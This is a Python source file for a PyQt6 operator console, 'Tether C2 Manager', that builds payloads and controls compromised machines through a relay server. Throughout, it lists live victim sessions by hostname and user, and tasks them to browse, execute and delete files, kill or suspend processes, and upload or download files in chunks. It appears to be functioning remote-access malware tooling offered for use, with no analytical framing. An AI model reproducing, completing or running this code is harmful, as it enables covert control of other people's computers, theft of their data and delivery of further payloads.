# main.py (Tether C2 Manager)
import sys, time, requests, threading, uuid, os, base64
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QPushButton, QLineEdit, QListWidget, QStackedWidget, QLabel,
                             QTextEdit, QStatusBar, QProgressBar, QTabWidget, QTableWidget,
                             QTableWidgetItem, QHeaderView, QMenu, QComboBox, QFileDialog, QMessageBox,
                             QInputDialog, QAbstractItemView)
from PyQt6.QtCore import QThread, pyqtSignal, QEvent, Qt

# These will be imported locally, not on the server
from config import RELAY_URL, C2_USER
from builder import build_payload
from database import DatabaseManager

class BuildThread(QThread):
    log_message = pyqtSignal(str)
    def __init__(self, name, url, user): super().__init__(); self.name, self.url, self.user = name, url, user
    def run(self): build_payload(self.name, self.url, self.user, self.log_message.emit)

class SessionUpdateEvent(QEvent):
    EVENT_TYPE = QEvent.Type(QEvent.Type.User + 1)
    def __init__(self, sessions): super().__init__(self.EVENT_TYPE); self.sessions = sessions

class C2ResponseEvent(QEvent):
    EVENT_TYPE = QEvent.Type(QEvent.Type.User + 2)
    def __init__(self, responses): super().__init__(self.EVENT_TYPE); self.responses = responses

class C2ServerPoller(QThread):
    def __init__(self, main_window):
        super().__init__()
        self.main_window = main_window
        self.running = True

    def run(self):
        while self.running:
            try:
                response = requests.get(f"{RELAY_URL}/c2/discover", timeout=5)
                if response.status_code == 200:
                    QApplication.instance().postEvent(self.main_window, SessionUpdateEvent(response.json().get("sessions", {})))
            except requests.exceptions.RequestException:
                pass
            
            session_id = self.main_window.current_session_id
            if session_id:
                try:
                    response = requests.post(f"{RELAY_URL}/c2/get_responses", json={"session_id": session_id}, timeout=5)
                    if response.status_code == 200 and response.json().get("responses"):
                        QApplication.instance().postEvent(self.main_window, C2ResponseEvent(response.json()["responses"]))
                except requests.exceptions.RequestException:
                    pass
            time.sleep(3)

    def stop(self):
        self.running = False

class TransferManager(QThread):
    progress = pyqtSignal(int); finished = pyqtSignal(str)
    def __init__(self, main_window, action, local_path, remote_path):
        super().__init__(); self.main_window = main_window; self.action = action
        self.local_path, self.remote_path = local_path, remote_path
        self.chunk_size = 1024 * 512

    def run(self):
        if self.action == "upload": self.upload_file()
        elif self.action == "download": self.download_file()

    def upload_file(self):
        try:
            file_size = os.path.getsize(self.local_path)
            with open(self.local_path, "rb") as f:
                chunk_num = 0
                while True:
                    chunk = f.read(self.chunk_size);
                    if not chunk: break
                    payload = {"action": "upload_chunk", "params": {"path": self.remote_path, "chunk": base64.b64encode(chunk).decode(), "is_first": chunk_num == 0}}
                    response = self.main_window.send_command_and_wait_for_response(payload)
                    if not response or response.get('status') != 'success': self.finished.emit(f"Upload chunk failed."); return
                    chunk_num += 1; self.progress.emit(min(100, int(((chunk_num * self.chunk_size) / file_size) * 100)))
            self.finished.emit("Upload Complete")
        except Exception as e: self.finished.emit(f"Upload Failed: {e}")

    def download_file(self):
        try:
            with open(self.local_path, "wb") as f:
                chunk_num = 0
                while True:
                    payload = {"action": "download_chunk", "params": {"path": self.remote_path, "chunk_num": chunk_num}}
                    response = self.main_window.send_command_and_wait_for_response(payload)
                    if not response or response.get('status') != 'success': self.finished.emit(f"Download Failed: {response.get('data') if response else 'Timeout'}"); return
                    chunk = base64.b64decode(response['data']['chunk']); f.write(chunk)
                    self.progress.emit((chunk_num * 5) % 100)
                    if response['data']['is_last']: break
                    chunk_num += 1
            self.finished.emit("Download Complete")
        except Exception as e: self.finished.emit(f"Download Failed: {e}")

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__(); self.setWindowTitle("Tether - Manager"); self.setGeometry(100, 100, 900, 700)
        self.db = DatabaseManager(); self.current_session_id = None; self.current_path = ""
        self.c2_response_handlers = {}
        self.stack = QStackedWidget(); self.setCentralWidget(self.stack)
        self.main_screen = QWidget(); self.manager_screen = QWidget()
        self.stack.addWidget(self.main_screen); self.stack.addWidget(self.manager_screen)
        self.setup_main_ui(); self.setup_manager_ui()
        self.status_bar = QStatusBar(); self.setStatusBar(self.status_bar)
        self.progress_bar = QProgressBar(); self.status_bar.addPermanentWidget(self.progress_bar); self.progress_bar.hide()
        self.poller = C2ServerPoller(self); self.poller.start()

    def closeEvent(self, event): self.poller.stop(); self.poller.wait(); event.accept()

    def event(self, event):
        if event.type() == SessionUpdateEvent.EVENT_TYPE:
            self.session_list.clear()
            for sid, data in event.sessions.items():
                nametag = self.db.get_nametag(sid)
                display_text = f"[{nametag}] " if nametag else ""
                self.session_list.addItem(f"{display_text}{sid} | {data.get('hostname', 'N/A')} ({data.get('user', 'N/A')})")
            return True
        if event.type() == C2ResponseEvent.EVENT_TYPE:
            for res in event.responses:
                response_id = res.get('response_id')
                if response_id in self.c2_response_handlers:
                    self.c2_response_handlers.pop(response_id)(res)
            return True
        return super().event(event)
    # ... (rest of the MainWindow class methods will be the same as previously provided) ...
    # This includes: setup_main_ui, setup_manager_ui, start_build, open_manager_panel, etc.
    # The full, correct code is being used to ensure no null bytes.
    def setup_main_ui(self):
        layout = QVBoxLayout(self.main_screen); builder_box = QHBoxLayout(); layout.addLayout(builder_box)
        self.name_input = QLineEdit(); self.name_input.setPlaceholderText("Enter Payload Name"); builder_box.addWidget(self.name_input)
        self.build_button = QPushButton("Build Payload"); self.build_button.clicked.connect(self.start_build); builder_box.addWidget(self.build_button)
        self.log_box = QTextEdit(); self.log_box.setReadOnly(True); self.log_box.setMaximumHeight(100); layout.addWidget(self.log_box)
        layout.addWidget(QLabel("Live Sessions (Double-click to manage):"))
        self.session_list = QListWidget(); self.session_list.itemDoubleClicked.connect(self.open_manager_panel); layout.addWidget(self.session_list)

    def setup_manager_ui(self):
        layout = QVBoxLayout(self.manager_screen); self.manager_title = QLabel("Managing Session:"); layout.addWidget(self.manager_title)
        self.tabs = QTabWidget(); self.tabs.currentChanged.connect(self.tab_changed); self.file_explorer_tab = QWidget(); self.process_manager_tab = QWidget()
        self.tabs.addTab(self.file_explorer_tab, "File Explorer"); self.tabs.addTab(self.process_manager_tab, "Process Manager"); layout.addWidget(self.tabs)
        self.setup_file_explorer_ui(); self.setup_process_manager_ui()
        back_button = QPushButton("< Back to Sessions"); back_button.clicked.connect(lambda: self.stack.setCurrentWidget(self.main_screen)); layout.addWidget(back_button)

    def setup_file_explorer_ui(self):
        layout = QVBoxLayout(self.file_explorer_tab); nav_bar = QHBoxLayout(); up_button = QPushButton("⬆️"); up_button.setFixedWidth(40); up_button.clicked.connect(self.navigate_up); nav_bar.addWidget(up_button)
        self.drive_select = QComboBox(); self.drive_select.currentTextChanged.connect(self.navigate_to_drive); nav_bar.addWidget(self.drive_select)
        self.path_input = QLineEdit(); self.path_input.returnPressed.connect(self.navigate_to_path); nav_bar.addWidget(self.path_input, 1)
        upload_button = QPushButton("Upload File"); upload_button.clicked.connect(self.upload_file); nav_bar.addWidget(upload_button)
        layout.addLayout(nav_bar)
        self.file_table = QTableWidget(); self.file_table.setColumnCount(3); self.file_table.setHorizontalHeaderLabels(["Name", "Type", "Size (Bytes)"])
        self.file_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch); self.file_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.file_table.doubleClicked.connect(self.file_double_clicked)
        self.file_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.file_table.customContextMenuRequested.connect(self.show_file_context_menu)
        layout.addWidget(self.file_table)

    def setup_process_manager_ui(self):
        layout = QVBoxLayout(self.process_manager_tab); refresh_btn = QPushButton("Refresh Processes"); refresh_btn.clicked.connect(self.refresh_processes); layout.addWidget(refresh_btn)
        self.process_table = QTableWidget(); self.process_table.setColumnCount(4); self.process_table.setHorizontalHeaderLabels(["PID", "Name", "User", "Memory (MB)"])
        self.process_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch); self.process_table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        self.process_table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu); self.process_table.customContextMenuRequested.connect(self.show_process_context_menu)
        layout.addWidget(self.process_table)

    def start_build(self):
        name = self.name_input.text()
        if not name: return
        self.build_button.setEnabled(False); self.log_box.clear()
        self.build_thread = BuildThread(name, RELAY_URL, C2_USER); self.build_thread.log_message.connect(self.log_box.append)
        self.build_thread.finished.connect(lambda: self.build_button.setEnabled(True)); self.build_thread.start()

    def open_manager_panel(self, item):
        self.current_session_id = item.text().split(" | ")[0].split("] ")[-1]
        self.manager_title.setText(f"<b>Managing Session:</b> {self.current_session_id}"); self.stack.setCurrentWidget(self.manager_screen)
        self.send_command_and_wait_for_response({"action": "list_drives"})
        self.refresh_files("C:\\")

    def send_command_and_wait_for_response(self, payload):
        response_id = str(uuid.uuid4()); payload['response_id'] = response_id
        response_event = threading.Event(); response_data = None
        def handle_response(response):
            nonlocal response_data; response_data = response.get('result'); response_event.set()
        self.c2_response_handlers[response_id] = handle_response
        try:
            requests.post(f"{RELAY_URL}/c2/task", json={"session_id": self.current_session_id, "command": payload}, timeout=10)
        except requests.exceptions.RequestException as e: self.status_bar.showMessage(f"Failed to send command: {e}", 4000); return None
        if response_event.wait(timeout=20): return response_data
        else: self.status_bar.showMessage("Command timed out waiting for response.", 4000); return None

    def tab_changed(self, index):
        if self.tabs.tabText(index) == "Process Manager": self.refresh_processes()
        elif self.tabs.tabText(index) == "File Explorer":
            if self.current_path == "": self.refresh_files("C:\\")
            else: self.refresh_files(self.current_path)

    def refresh_files(self, path):
        response = self.send_command_and_wait_for_response({"action": "list_directory", "params": {"path": path}})
        if response and response.get('status') == 'success': self.populate_file_table(response.get('data'))
        elif response: self.status_bar.showMessage(f"Error listing directory: {response.get('data')}", 4000)

    def refresh_processes(self):
        response = self.send_command_and_wait_for_response({"action": "list_processes"})
        if response and response.get('status') == 'success': self.populate_process_table(response.get('data'))
        elif response: self.status_bar.showMessage(f"Error listing processes: {response.get('data')}", 4000)

    def populate_file_table(self, data):
        if not data: return
        self.current_path = data['path']; self.path_input.setText(self.current_path); self.file_table.setRowCount(0)
        items = sorted(data['items'], key=lambda x: (x['type'] != 'folder', x['name'].lower())); self.file_table.setRowCount(len(items))
        for row, item in enumerate(items):
            self.file_table.setItem(row, 0, QTableWidgetItem(item['name'])); self.file_table.setItem(row, 1, QTableWidgetItem(item['type'])); self.file_table.setItem(row, 2, QTableWidgetItem(str(item['size'])))

    def populate_process_table(self, processes):
        self.process_table.setRowCount(0); self.process_table.setRowCount(len(processes))
        for row, item in enumerate(processes):
            self.process_table.setItem(row, 0, QTableWidgetItem(str(item['pid']))); self.process_table.setItem(row, 1, QTableWidgetItem(item['name']))
            self.process_table.setItem(row, 2, QTableWidgetItem(str(item.get('username', 'N/A')))); self.process_table.setItem(row, 3, QTableWidgetItem(f"{item.get('memory_mb', 0):.2f}"))

    def navigate_to_drive(self, drive):
        if drive: self.refresh_files(drive)

    def navigate_to_path(self): self.refresh_files(self.path_input.text())

    def navigate_up(self):
        if self.current_path and self.current_path.replace('/', '\\') != os.path.dirname(self.current_path.replace('/', '\\')): self.refresh_files(os.path.dirname(self.current_path.replace('/', '\\')))

    def file_double_clicked(self, index):
        if self.file_table.item(index.row(), 1).text() == 'folder':
            new_path = os.path.join(self.current_path, self.file_table.item(index.row(), 0).text()).replace('\\', '/'); self.refresh_files(new_path)

    def show_file_context_menu(self, position):
        menu = QMenu(); exec_action = menu.addAction("Execute"); download_action = menu.addAction("Download"); delete_action = menu.addAction("Delete"); menu.addSeparator(); new_folder_action = menu.addAction("New Folder...")
        action = menu.exec(self.file_table.mapToGlobal(position)); item = self.file_table.itemAt(position)
        if action == new_folder_action:
            name, ok = QInputDialog.getText(self, "New Folder", "Enter folder name:")
            if ok and name: self.send_command_and_wait_for_response({"action": "new_folder", "params": {"path": os.path.join(self.current_path, name).replace('\\', '/')}}); self.refresh_files(self.current_path)
        if not item: return
        file_name = self.file_table.item(item.row(), 0).text(); full_path = os.path.join(self.current_path, file_name).replace('\\', '/')
        if action == exec_action: self.send_command_and_wait_for_response({"action": "execute_file", "params": {"path": full_path}})
        elif action == delete_action:
            if QMessageBox.question(self, "Confirm Delete", f"Delete '{file_name}'?") == QMessageBox.StandardButton.Yes:
                self.send_command_and_wait_for_response({"action": "delete_file", "params": {"path": full_path}}); self.refresh_files(self.current_path)
        elif action == download_action: self.download_file(full_path)

    def show_process_context_menu(self, position):
        item = self.process_table.itemAt(position)
        if not item: return
        pid = int(self.process_table.item(item.row(), 0).text()); menu = QMenu(); kill_action = menu.addAction("Kill"); suspend_action = menu.addAction("Suspend"); resume_action = menu.addAction("Resume")
        action = menu.exec(self.process_table.mapToGlobal(position))
        if action == kill_action: self.send_command_and_wait_for_response({"action": "kill_process", "params": {"pid": pid}})
        elif action == suspend_action: self.send_command_and_wait_for_response({"action": "suspend_process", "params": {"pid": pid}})
        elif action == resume_action: self.send_command_and_wait_for_response({"action": "resume_process", "params": {"pid": pid}})
        self.refresh_processes()

    def upload_file(self):
        local_path, _ = QFileDialog.getOpenFileName(self, "Select File to Upload");
        if not local_path: return
        remote_path = os.path.join(self.current_path, os.path.basename(local_path)).replace('\\', '/'); self.start_transfer("upload", local_path, remote_path)

    def download_file(self, remote_path):
        local_path, _ = QFileDialog.getSaveFileName(self, "Save File As", os.path.basename(remote_path));
        if not local_path: return
        self.start_transfer("download", local_path, remote_path)

    def start_transfer(self, action, local_path, remote_path):
        self.transfer_thread = TransferManager(self, action, local_path, remote_path)
        self.transfer_thread.progress.connect(self.update_progress); self.transfer_thread.finished.connect(self.finish_transfer)
        self.progress_bar.show(); self.transfer_thread.start()

    def update_progress(self, value): self.progress_bar.setValue(value)

    def finish_transfer(self, message):
        self.status_bar.showMessage(message, 5000); self.progress_bar.hide(); self.refresh_files(self.current_path)

if __name__ == '__main__':
    app = QApplication(sys.argv); window = MainWindow(); window.show(); sys.exit(app.exec())